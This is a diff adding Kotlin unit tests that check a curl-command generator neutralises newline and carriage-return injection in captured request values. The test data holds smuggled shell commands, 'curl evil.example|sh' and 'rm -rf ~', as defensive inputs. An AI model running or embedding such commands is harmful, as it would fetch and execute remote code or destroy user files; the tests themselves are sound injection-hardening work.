@@ -239,4 +239,27 @@ class CurlTest {
         val tx = pending(1, url = "https://h/", headers = listOf("X-Empty" to "", "Accept" to " ", "X-Full" to "v"))
         assertEquals("curl -X GET 'https://h/' -H 'X-Empty;' -H 'Accept;' -H 'X-Full: v'", toCurl(tx))
     }
+
+    @Test
+    fun deviceValuesCannotBreakOutOfACommentLine() {
+        val skipped = CapturedBody(ByteArray(0), null, false, null, "x\ncurl evil.example|sh #")
+        val tx = pending(
+            1,
+            method = "POST",
+            url = "https://h/",
+            headers = listOf("Content-Length" to "5\rrm -rf ~ #"),
+            body = skipped,
+        )
+        val lines = toCurl(tx).lines()
+        assertTrue(lines.dropLast(1).all { it.startsWith("# ") }, lines.joinToString("\n"))
+        assertTrue(lines.last().startsWith("curl "), lines.last())
+        assertEquals("# warning: request body was not captured (x?curl evil.example|sh #); this command sends no body", lines[0])
+        assertTrue(lines[1].startsWith("# note: Content-Length header (5?rm -rf ~ #)"), lines[1])
+    }
+
+    @Test
+    fun commentValuesAreCapped() {
+        assertEquals(201, commentSafe("a".repeat(5000)).length)
+        assertEquals("a?b?c", commentSafe("a\u001bb\u2028c"))
+    }
 }
